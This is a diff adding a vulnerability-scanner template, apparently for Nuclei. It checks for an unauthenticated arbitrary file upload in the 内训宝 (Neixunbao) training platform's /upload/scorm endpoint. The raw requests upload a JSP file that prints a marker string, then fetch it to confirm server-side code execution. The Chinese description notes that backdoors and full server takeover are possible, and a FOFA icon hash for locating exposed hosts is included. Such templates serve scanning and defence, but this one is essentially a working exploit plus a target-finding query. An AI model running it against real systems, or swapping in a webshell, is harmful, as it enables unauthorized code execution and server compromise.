@@ -1,0 +1,51 @@
+http:
+    - extractors:
+        - group: 1
+          internal: true
+          name: uploadfile
+          part: body
+          regex:
+            - ([0-9]+/\w+\.jsp)
+          type: regex
+      raw:
+        - |
+          POST /upload/scorm HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+          Accept-Encoding: gzip, deflate
+          Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+          Accept: */*
+          Connection: close
+
+          ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+          Content-Disposition: form-data; name="fileupload"; filename="{{username}}.jsp"
+          Content-Type: application/octet-stream
+
+          <% out.println("pboyjnnrfipmplsukdeczudsefxmywe");%>
+          ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - pboyjnnrfipmplsukdeczudsefxmywe
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /upload/imgdefault/common/{{uploadfile}} HTTP/1.1
+          Host: {{Hostname}}
+id: neixunbao-upload_scorm-File-upload
+info:
+    author: Superhero
+    description: |-
+        fofa: icon_hash="-790843908"
+        内训宝企业培训平台 upload/scorm 接口存在文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+    name: 内训宝企业培训平台 upload/scorm 任意文件上传漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/I4RKLZDQqUSrWkVW4fnBHw?token=1497378487&lang=zh_CN
+    severity: high
+    tags: []
+variables:
+    username: '{{to_lower(rand_base(6))}}'
